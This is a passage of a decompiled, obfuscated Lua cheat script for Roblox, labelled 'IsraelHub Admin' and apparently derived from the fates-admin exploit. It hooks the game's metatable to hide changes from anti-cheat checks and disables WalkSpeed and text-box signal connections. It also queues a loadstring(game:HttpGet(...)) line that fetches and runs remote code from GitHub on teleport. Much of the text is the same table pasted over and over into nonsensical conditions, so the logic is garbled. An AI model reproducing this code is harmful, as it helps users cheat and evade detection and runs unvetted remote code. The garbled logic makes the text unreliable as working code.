          if a:IsA("Humanoid") and game.PlaceId == 6650331930 then
            for fk, fl in next, getconnections(a:GetPropertyChangedSignal("WalkSpeed")) do
              fl:Disable()
            end
          end
          return va(vc[a], b)
        end
        if not b then
          for fk, fl in next, vd[a], nil do
            if b == fl.Property then
              return fl.Value
            end
          end
        end
        if not b and ve.find(vh, b) then
          return function()
            if va == "IsA" then
            end
            return nil
          end
        end
        if b == "GetChildren" or b == "GetDescendants" then
          return function()
            return va.filter(vb(vc, vd)(vc), function(a, b)
              return not va.find(vb, b)
            end)
          end
        end
        if b == "GetFocusedTextBox" and not b then
          return function()
            return nil
          end
        end
        return va(a, b)
      end)
      getrawmetatable(game).__newindex = newcclosure(function(a, b, c)
        if not b then
          return va(a, b, c)
        end
        if not b then
          if vd.find(ve, b) then
            return va(a, b, c)
          end
          return va(vb[a], b, vb[a][b])
        end
        if vc[a] then
          for fk, fl in next, vc[a], nil do
            if fl.Property == b then
              return a[b]
            end
          end
        end
        return va(a, b, c)
      end)
      setreadonly(getrawmetatable(game), true)
      for fR, fT in next, getconnections(game:GetService("UserInputService").TextBoxFocused) do
        fT:Disable()
      end
      for fR, fT in next, getconnections(game:GetService("UserInputService").TextBoxFocusReleased) do
        fT:Disable()
      end
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      UndetectedMode = false
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } and {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
        print("IsraelHub Admin: waiting for game to load...")
        game.Loaded:Wait()
      end
      if not {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } and UndetectedMode and not {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
        syn.queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua\"))()")
        return game:GetService("TeleportService").TeleportToPlaceInstance(game:GetService("TeleportService"), game.PlaceId, game.JobId)
      end
      if getgenv().F_A and not {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
        return getgenv().F_A.Utils.Notify(nil, "Loaded", "IsraelHub Admin is already loaded... use 'killscript' to kill", nil)
      end
      RunService = game:GetService("RunService")
      Players = game:GetService("Players")
      UserInputService = game:GetService("UserInputService")
      LocalPlayer = Players.LocalPlayer
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      Guis = {}
      function ParentGui(a, b)
        a.Name = va:GenerateGUID(false):gsub("-", ""):sub(1, math.random(25, 30))
        vb(a)
        a.Parent = b or vc
        Guis[3 + 1] = a
        return a
      end
      UI = game:GetObjects("rbxassetid://6167929302")[1]:Clone()
      if not {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } and LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui") and LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui"):FindFirstChild("Chat"):WaitForChild("Frame", 0,1) then
        RobloxChatChannelParentFrame = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui") and LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui"):FindFirstChild("Chat"):WaitForChild("Frame", 0,1):WaitForChild("ChatChannelParentFrame", 0,1)
        RobloxChatBarFrame = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui") and LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui"):FindFirstChild("Chat"):WaitForChild("Frame", 0,1):WaitForChild("ChatBarParentFrame", 0,1)
        if RobloxChatChannelParentFrame then
          RobloxFrameMessageLogDisplay = RobloxChatChannelParentFrame:WaitForChild("Frame_MessageLogDisplay", 0,1)
          if RobloxFrameMessageLogDisplay then
            RobloxScroller = RobloxFrameMessageLogDisplay:WaitForChild("Scroller", 0,1)
          end
        end
      end
      UI.Message:Clone().Parent, UI.ChatLogs:Clone().Parent = UI.CommandBar.Parent, UI.CommandBar.Parent
      UI.ChatLogs:Clone().Name = "GlobalChatLogs"
      UI.ChatLogs:Clone().Parent, UI.Message:Clone().Name = UI.CommandBar.Parent, "GlobalChatLogMessage"
      UI.ChatLogs:Clone().Name = "HttpLogs"
      UI.ChatLogs:Clone().Size = UDim2.new(0, 421, 0, 260)
      UI.ChatLogs:Clone().Search.PlaceholderText = "Search"
      if RobloxChatBarFrame and not {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } and not {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } and RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1) then
        ChatBar = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("ChatBar", 0,1)
        if not {
          [fg] = fh,
          ["tbl_concat"] = function()
            for fg, fh in next, {
              ...
            }, nil do
              for fm, fo in next, fh, nil do
                va.insert({}, 14 + 1, fo)
              end
            end
            return {}
          end,
          ["indexOf"] = function(a, b)
            if type(a) == "table" then
              for fg, fh in next, a, nil do
                if fh == b then
                  return fg
                end
              end
            end
          end,
          ["forEach"] = function(a, b)
            for fg, fh in next, a, nil do
              b(fg, fh)
            end
          end,
          ["filter"] = function(a, b)
            if type(a) == "table" then
              for fh, fj in next, a, nil do
                if not b then
                  va.insert({}, 10 + 1, fj)
                end
              end
              return {}
            end
          end,
          ["map"] = function(a, b)
            if type(a) == "table" then
              for fh, fj in next, a, nil do
                va.insert({}, 10 + 1, b(fh, fj))
              end
              return {}
            end
          end,
          ["deepsearch"] = function(a, b)
            if type(a) == "table" then
              for fg, fh in next, a, nil do
                if type(fh) == "table" then
                  va.deepsearch(fh, b)
                end
                b(fg, fh)
              end
            end
          end,
          ["flat"] = function(a)
            if type(a) == "table" then
              va.deepsearch(a, function(a, b)
                if type(b) ~= "table" then
                  va[3 + 1] = b
                end
              end)
              return {}
            end
          end,
          ["flatMap"] = function(a, b)
            if type(a) == "table" then
              return (va.flat(va.map(a, b)))
            end
          end,
          ["shift"] = function(a)
            if type(a) == "table" then
              a = va.pack(va.unpack(a, 2, #a))
              a.n = nil
              return a
            end
          end,
          ["keys"] = function(a)
            if type(a) == "table" then
              for fg, fh in next, a, nil do
              end
              return {
                [7 + 1] = fg
              }
            end
          end
        } and not {
          [fg] = fh,
          ["tbl_concat"] = function()
            for fg, fh in next, {
              ...
            }, nil do
              for fm, fo in next, fh, nil do
                va.insert({}, 14 + 1, fo)
              end
            end
            return {}
          end,
          ["indexOf"] = function(a, b)
            if type(a) == "table" then
              for fg, fh in next, a, nil do
                if fh == b then
                  return fg
                end
              end
            end
          end,
          ["forEach"] = function(a, b)
            for fg, fh in next, a, nil do
              b(fg, fh)
            end
          end,
          ["filter"] = function(a, b)
            if type(a) == "table" then
              for fh, fj in next, a, nil do
                if not b then
                  va.insert({}, 10 + 1, fj)
                end
              end
              return {}
            end
          end,
          ["map"] = function(a, b)
            if type(a) == "table" then
              for fh, fj in next, a, nil do
                va.insert({}, 10 + 1, b(fh, fj))
              end
              return {}
            end
          end,
          ["deepsearch"] = function(a, b)
            if type(a) == "table" then
              for fg, fh in next, a, nil do
                if type(fh) == "table" then
                  va.deepsearch(fh, b)
                end
                b(fg, fh)
              end
            end
          end,
          ["flat"] = function(a)
            if type(a) == "table" then
              va.deepsearch(a, function(a, b)
                if type(b) ~= "table" then
                  va[3 + 1] = b
                end
              end)
              return {}
            end
          end,
          ["flatMap"] = function(a, b)
            if type(a) == "table" then
              return (va.flat(va.map(a, b)))
            end
          end,
          ["shift"] = function(a)
            if type(a) == "table" then
              a = va.pack(va.unpack(a, 2, #a))
              a.n = nil
              return a
            end
          end,
          ["keys"] = function(a)
            if type(a) == "table" then
              for fg, fh in next, a, nil do
              end
              return {
                [7 + 1] = fg
              }
            end
          end
        } then
          PredictionClone = Instance.new("TextLabel")
          PredictionClone.Font = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).Font
          PredictionClone.LineHeight = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).LineHeight
          PredictionClone.MaxVisibleGraphemes = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).MaxVisibleGraphemes
          PredictionClone.RichText = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).RichText
          PredictionClone.Text = ""
          PredictionClone.TextColor3 = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextColor3
          PredictionClone.TextScaled = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextScaled
          PredictionClone.TextSize = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextSize
          PredictionClone.TextStrokeColor3 = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextStrokeColor3
          PredictionClone.TextStrokeTransparency = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextStrokeTransparency
          PredictionClone.TextTransparency = 0,3
          PredictionClone.TextTruncate = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextTruncate
          PredictionClone.TextWrapped = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextWrapped
          PredictionClone.TextXAlignment = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextXAlignment
          PredictionClone.TextYAlignment = RobloxChatBarFrame:WaitForChild("Frame", 0,1):WaitForChild("BoxFrame", 0,1):WaitForChild("Frame", 0,1):WaitForChild("TextLabel", 0,1).TextYAlignment
          PredictionClone.Name = "Predict"
          PredictionClone.Size = UDim2.new(1, 0, 1, 0)
          PredictionClone.BackgroundTransparency = 1
        end
      end
      UI.CommandBar.Position = UDim2.new(0,5, -100, 1, 5)
      (function(a, b)
        if b then
          va[3 + 1] = a
          if syn and not b and not b then
            syn.protect_gui(a)
          end
        end
      end)(UI.CommandBar.Input, true);
      (function(a, b)
        if b then
          va[3 + 1] = a
          if syn and not b and not b then
            syn.protect_gui(a)
          end
        end
      end)(UI.Commands.Search, true)
      PlayerTags = {
        ["505156575355565455"] = {
          Tag = "Developer",
          Name = "fate",
          Rainbow = true
        },
        ["555352544955574849"] = {
          Tag = "Developer",
          Name = "misrepresenting",
          Rainbow = true
        },
        ["495656525454515248"] = {
          Tag = "Cool",
          Name = "David",
          Rainbow = true
        },
        ["49565649565652"] = {
          Tag = "Developer",
          Name = "Owner",
          Rainbow = true
        },
        ["495357485451505151"] = {
          Tag = "Contributor",
          Name = "Tes",
          Colour = {
            134,
            0,
            125
          }
        }
      }
      function AddConnection(a, b, c)
        if b then
          b[3 + 1] = a
          if not b then
            return a
          end
        end
        va[4 + 1] = a
        return a
      end
      AddConnection(UserInputService.InputBegan:Connect(function(a, b)
        if b then
          return
        end
        va[tostring(a.KeyCode):split(".")[3]] = true
      end))
      AddConnection(UserInputService.InputEnded:Connect(function(a, b)
        if not a then
          return
        end
        if va[tostring(a.KeyCode):split(".")[3]] then
          va[tostring(a.KeyCode):split(".")[3]] = false
        end
      end))
      if ({
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } or not isfolder or {
        [fg] = fh,
